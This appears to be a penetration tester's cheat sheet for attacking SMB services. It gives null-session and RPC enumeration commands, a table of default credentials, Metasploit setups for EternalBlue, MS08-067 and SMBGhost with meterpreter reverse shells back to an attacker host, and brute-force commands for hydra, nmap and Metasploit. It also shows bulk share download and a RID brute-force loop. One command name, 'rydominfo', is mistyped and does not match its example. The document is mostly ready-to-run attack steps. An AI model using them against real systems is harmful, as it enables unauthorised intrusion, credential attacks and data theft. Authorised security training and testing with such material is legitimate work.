---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SMB/Exploitation
links: "[[SMB]]"
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- SMB Null Session {{{-->
## SMB Null Session

An [SMB Null Session](https://hackviser.com/tactics/pentesting/services/smb#smb-null-session)
refers to an unauthenticated connection to an SMB server ^f374c7

<!-- Smbclient {{{-->
### Smbclient

[[Usage#smbclient|smbclient]] —
Enumerate SMB shares on the host
(*[Anonymous Null Session](https://hackviser.com/tactics/pentesting/services/smb#smb-null-session)*)

<!-- Linux {{{-->
#### Linux

Connect to server and list shares (*[Anonymous Null Session](https://hackviser.com/tactics/pentesting/services/smb#smb-null-session)*)

```sh
smbclient -N -L //<target>
```

<!-- Info {{{-->
> [!info]-
>
> - `-N`: Null session / Anonymous access
> - `-L`: List shares
<!-- }}} -->


Connect to server and list shares (*implicit null creds*)

```sh
smbclient --no-pass  -N -L //<target>
```

Connect to server and list shares (*explicit null creds*)

```sh
smbclient --user ''%'' -N -L //<target>
```

Downgrade SMB dialect

```sh
smbclient -N //<target>/ --option="client min protocol"=LANMAN1
```

<!-- Info {{{-->
> [!info]-
>
> - `-N`: Null session / Anonymous access
> - `--option="client min protocol"=LANMAN1`: Set minimum SMB dialect to LANMAN1
>   (Legacy)
<!-- }}} -->

<!-- }}} -->

<!-- Windows {{{-->
#### Windows

Connect to server and list shares (*[Anonymous Null Session](https://hackviser.com/tactics/pentesting/services/smb#smb-null-session),
Windows UNC path*)

```sh
smbclient -N -L \\\\<target>\\
```

<!-- Info {{{-->
> [!info]-
>
> - `-N`: Null session / Anonymous access
> - `-L`: List shares
<!-- }}} -->


Connect to server and list shares (*implicit null creds*)

```sh
smbclient --no-pass  -N -L \\\\<target>\\
```

Connect to server and list shares (*explicit null creds*)

```sh
smbclient --user ''%'' -N -L \\\\<target>\\
```

Downgrade SMB dialect

```sh
smbclient -N \\\\<target>\\ --option="client min protocol"=LANMAN1
```

<!-- Info {{{-->
> [!info]-
>
> - `-N`: Null session / Anonymous access
> - `--option="client min protocol"=LANMAN1`: Set minimum SMB dialect to LANMAN1
>   (Legacy)
<!-- }}} -->


<!-- }}} -->

<!-- }}} -->

<!-- SMBmap {{{-->
### SMBmap

[SMBmap](https://github.com/ShawnDEvans/smbmap) —
Enumerate SMB shares on the host
(*[Anonymous Null Session](https://hackviser.com/tactics/pentesting/services/smb#smb-null-session)*)

```sh
smbmap -H <target>
```

```sh
smbmap -H <target> -u "" -p ""
```

```sh
smbmap -H <target> -u null -p null
```

```sh
smbmap -H <target> -u guest
```

<!-- Info {{{-->
> [!info]-
>
> - `-H`: Specify the host IP
> - `-u ""`: Supply an empty username
> - `-p ""`: Supply an empty password
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> smbmap -H 10.129.14.128
> ```
> ```sh
> [+] Finding open SMB ports....
> [+] User SMB session established on 10.129.14.128...
> [+] IP: 10.129.14.128:445       Name: 10.129.14.128
>         Disk                                                    Permissions     Comment
>         ----                                                    -----------     -------
>         print$                                                  NO ACCESS       Printer Drivers
>         home                                                    NO ACCESS       INFREIGHT Samba
>         dev                                                     NO ACCESS       DEVenv
>         notes                                                   NO ACCESS       CheckIT
>         IPC$                                                    NO ACCESS       IPC Service (DEVSM)
> ```
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> Smbmap is a more detailed and more aggressive automated script
<!-- }}} -->

<!-- }}} -->
___

<!-- }}} -->

<!-- IPC$ Share {{{-->
## IPC$ Share

Remote Procedure Call ([[General#RPC|RPC]]) Enumeration
through anonymous null session

<!-- RPCclient {{{-->
### RPCclient

[RPCclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
is a utility to test MS-RPC functionality in Samba

Connect without credentials
(*[SMB Null Session](https://hackviser.com/tactics/pentesting/services/smb#smb-null-session)*)

```sh
rpcclient <target>
```

```sh
rpcclient -U "" <target>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient -U "" 10.129.244.136
> ```
>
> Press `Enter` to bypass the password prompt
>
> ```sh
> Enter WORKGROUP\'s password:
> rpcclient $>
> ```
<!-- }}} -->

Connect with credentials

```sh
rpcclient -U "username%password" <target>
```

<!-- }}} -->

___

<!-- }}} -->

<!-- Common Credentials {{{-->
## Common Credentials

Log in with common credentials

<!-- Common Credentials {{{-->
> [!danger]- Common Credentials
>
> | Username             | Password                                |
> | -------------------- | --------------------------------------- |
> | (blank)              | (blank)                                 |
> | guest                | (blank)                                 |
> | Administrator, admin | (blank), password, administrator, admin |
> | arcserve             | arcserve, backup                        |
> | tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |
> | backupexec, backup   | backupexec, backup, arcada              |
> | test, lab, demo      | password, test, lab, demo               |
<!-- }}} -->

___

<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

Search for exploits with [[Metasploit]] and [[SearchSploit]]

```sh
msf> search type:exploit platform:windows target:2008 smb
```

```sh
searchsploit microsoft smb
```

<!-- EternalBlue (MS17-010) {{{-->
### EternalBlue

[[Metasploit]] — [SecWiki-MS17-010](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS17-010/ms17_010_eternalblue.rb)
(*[[EternalBlue]]*) SMB Remote Windows Kernel Pool Corruption
(*[ms17_010_eternalblue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)*)


```sh
use exploit/windows/smb/ms17_010_eternalblue
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/smb/ms17_010_eternalblue
> ```
> ```sh
> set RHOSTS <target>
> ```
> ```sh
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> ```
> ```sh
> set LHOST <attacker_ip>
> ```
> ```sh
> exploit
> ```
>
> > [!info]-
> >
> > Connects to each target on port 445.
> >
> > Sends specific SMBv1 crafted packets used
> > in known EternalBlue detection techniques.
> >
> > Checks for:
> > - SMBv1 support
> > - Signs of vulnerability to MS17-010
> > - System info (*OS, hostname, etc.*)
<!-- }}} -->

<!-- }}} -->

<!-- Netapi (MS08-067) {{{-->
### Netapi

[[Metasploit]] — MS08-067 Microsoft Server Service Relative Path Stack Corruption
(*[ms08_067_netapi](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/)*)


```sh
use exploit/windows/smb/ms08_067_netapi
```

> [!example]-
>
> ```sh
> use exploit/windows/smb/ms08_067_netapi
> ```
> ```sh
> set RHOSTS <target>
> ```
> ```sh
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> ```
> ```sh
> set LHOST <attacker_ip>
> ```
> ```sh
> exploit
> ```

<!-- }}} -->

<!-- SMBGhost (CVE-2020-0796) {{{-->
### SMBGhost

[[Metasploit]] — SMBv3 Compression Buffer Overflow
(*[cve_2020_0796_smbghost](https://www.rapid7.com/db/modules/exploit/windows/smb/cve_2020_0796_smbghost/)*)

```sh
use exploit/windows/smb/cve_2020_0796_smbghost
```

<!-- Example {{{-->
> [!example]-
>
> A remote code execution vulnerability exists in the way
> that the Microsoft [[General|SMB]] 3.1.1 (*SMBv3*) protocol
> handles certain requests
>
> ```sh
> use exploit/windows/smb/cve_2020_0796_smbghost
> ```
> ```sh
> set RHOSTS <target>
> ```
> ```sh
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> ```
> ```sh
> set LHOST <attacker_ip>
> ```
> ```sh
> exploit
> ```
<!-- }}} -->

<!-- }}} -->

___

<!-- }}} -->

<!-- Brute Force {{{-->
## Brute Force

Brute Force SMB Login

<!-- Wordlist {{{-->
> [!tip]- Wordlist
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
<!-- }}} -->

[[Nmap]] — Brute force SMB login
(*[smb-brute](https://nmap.org/nsedoc/scripts/smb-brute.html)*)

```sh
nmap <target> -p 445 --script smb-brute -oA smb-brute-force
```

[[Nmap]] — Brute force SMB login with custom credentials

```sh
nmap <target> -p 445 --script smb-brute --script-args userdb=<users.txt>,passdb=<passwords.txt> -oA smb-brute-force-custom-credentials
```

[[Hydra]] — Brute force SMB login

```sh
hydra -l <target_user> -P <passwords.txt> <target> smb -t 1
```

```sh
hydra -l administrator -P <passwords.txt> smb://<target>
```

[[Metasploit]] — Brute force SMB login

```sh
use auxiliary/scanner/smb/smb_login
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Search Exploit|Search Exploit]]
>
> 2. [[Metasploit#Select Exploit|Select Exploit]]
>
> ```sh
> use auxiliary/scanner/smb/smb_login
> ```
>
> 3. [[Metasploit#Set Option|Set options]]
>
> ```sh
> set RHOSTS target.com
> ```
>
> ```sh
> set USER_FILE /path/to/users.txt
> ```
>
> ```sh
> set PASS_FILE /path/to/passwords.txt
> ```
>
> ```sh
> set STOP_ON_SUCCESS true
> ```
>
> 4. [[Metasploit#Run Exploit|Run exploit]]
>
> ```sh
> exploit
> ```
<!-- }}} -->

___

<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

___

<!-- Smbclient {{{-->
## Smbclient

Download all files recursively from the current SMB share directory

```sh
recurse ON
```
```sh
prompt OFF
```
```sh
mget *
```

> [!info]-
>
> - `recurse ON`: Enable recursion into subdirectories
> - `prompt OFF`: Disable confirmation prompts for each file transfer
> - `mget *`: Download all files matching `*`

___
<!-- }}} -->

<!-- RPCclient {{{-->
## RPCclient

<!-- General {{{-->
### General

Query server information

```sh
srvinfo
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> srvinfo
> ```
> ```sh
> DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
> platform_id     :       500
> os version      :       6.1
> server type     :       0x809a03
> ```
<!-- }}} -->

Enumerate all deployed domains

```sh
enumdomains
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> enumdomains
> ```
> ```sh
> name:[DEVSMB] idx:[0x0]
> name:[Builtin] idx:[0x1]
> ```
<!-- }}} -->

Get domain, server and user information

```sh
rydominfo
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> querydominfo
> ```
> ```sh
> Domain:         DEVOPS
> Server:         DEVSMB
> Comment:        DEVSM
> Total Users:    2
> Total Groups:   0
> Total Aliases:  0
> Sequence No:    1632361158
> Force Logoff:   -1
> Domain Server State:    0x1
> Server Role:    ROLE_DOMAIN_PDC
> Unknown 3:      0x1
> ```
<!-- }}} -->

Enumerate all available shares

```sh
netshareenumall
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> netshareenumall
> ```
> ```sh
> netname: print$
>         remark: Printer Drivers
>         path:   C:\var\lib\samba\printers
>         password:
> netname: home
>         remark: INFREIGHT Samba
>         path:   C:\home\
>         password:
> netname: dev
>         remark: DEVenv
>         path:   C:\home\sambauser\dev\
>         password:
> netname: notes
>         remark: CheckIT
>         path:   C:\mnt\notes\
>         password:
> netname: IPC$
>         remark: IPC Service (DEVSM)
>         path:   C:\tmp
>         password:
> ```
<!-- }}} -->

Get info about specific share

```sh
netsharegetinfo <share>
```

<!-- Example {{{-->
> [!example]-
>
> Get info about the share `notes`
>
> ```sh
> rpcclient $> netsharegetinfo notes
> ```
> ```sh
> netname: notes
>         remark: CheckIT
>         path:   C:\mnt\notes\
>         password:
>         type:   0x0
>         perms:  0
>         max_uses:       -1
>         num_uses:       1
> revision: 1
> type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
> DACL
>         ACL     Num ACEs:       1       revision:       2
>         ---
>         ACE
>                 type: ACCESS ALLOWED (0) flags: 0x00 
>                 Specific bits: 0x1ff
>                 Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
>                 SID: S-1-1-0
> ```
<!-- }}} -->

<!-- }}} -->

<!-- User {{{-->
### User

Enumerate all domain users & get their `RID`

```sh
enumdomusers
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> enumdomusers
> ```
> ```sh
> user:[mrb3n] rid:[0x3e8]
> user:[cry0l1t3] rid:[0x3e9]
> ```
<!-- }}} -->

Enumerate user information by `RID`

```sh
queryuser 0x3e9
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> queryuser 0x3e9
> ```
> ```sh
>         User Name   :   cry0l1t3
>         Full Name   :   cry0l1t3
>         Home Drive  :   \\devsmb\cry0l1t3
>         Dir Drive   :
>         Profile Path:   \\devsmb\cry0l1t3\profile
>         Logon Script:
>         Description :
>         Workstations:
>         Comment     :
>         Remote Dial :
>         Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
>         Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
>         Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
>         Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
>         Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
>         Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
>         unknown_2[0..31]...
>         user_rid :      0x3e9
>         group_rid:      0x201
>         acb_info :      0x00000014
>         fields_present: 0x00ffffff
>         logon_divs:     168
>         bad_password_count:     0x00000000
>         logon_count:    0x00000000
>         padding1[0..7]...
>         logon_hrs[0..21]...
> ```
<!-- }}} -->

> [!tip]
>
> The results can be used to identify the
> [[Enumeration#Group Enumeration|group]]'s `RID`
> to retrieve information from the entire group

Brute force User `RID`s

```sh
for i in $(seq 500 1100); do \
    rpcclient -N -U "" <target> \
    -c "queryuser 0x$(printf '%x\n' $i)" | \
    grep "User Name\|user_rid\|group_rid" && \
    echo ""; \
done
```

[[Impacket]] - [samrdump.py](https://github.com/fortra/impacket/blob/master/examples/samrdump.py)
— Brute force User RIDs

```sh
impacket-samrdump <target>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> impacket-samrdump 10.129.14.128
> ```
> ```sh
> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
>
> [*] Retrieving endpoint list from 10.129.14.128
> Found domain(s):
>  . DEVSMB
>  . Builtin
> [*] Looking up users in domain DEVSMB
> Found user: mrb3n, uid = 1000
> Found user: cry0l1t3, uid = 1001
> mrb3n (1000)/FullName: 
> mrb3n (1000)/UserComment: 
> mrb3n (1000)/PrimaryGroupId: 513
> mrb3n (1000)/BadPasswordCount: 0
> mrb3n (1000)/LogonCount: 0
> mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
> mrb3n (1000)/PasswordDoesNotExpire: False
> mrb3n (1000)/AccountIsDisabled: False
> mrb3n (1000)/ScriptPath: 
> cry0l1t3 (1001)/FullName: cry0l1t3
> cry0l1t3 (1001)/UserComment: 
> cry0l1t3 (1001)/PrimaryGroupId: 513
> cry0l1t3 (1001)/BadPasswordCount: 0
> cry0l1t3 (1001)/LogonCount: 0
> cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
> cry0l1t3 (1001)/PasswordDoesNotExpire: False
> cry0l1t3 (1001)/AccountIsDisabled: False
> cry0l1t3 (1001)/ScriptPath: 
> [*] Received 2 entries.
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Group {{{-->
### Group

Enumerate group information by `RID` (*acquired from
[[Enumeration#User Enumeration|user information]]*)

```sh
querygroup 0x201
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rpcclient $> querygroup 0x201
> ```
> ```sh
>         Group Name:     None
>         Description:    Ordinary Users
>         Group Attribute:7
>         Num Members:2
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
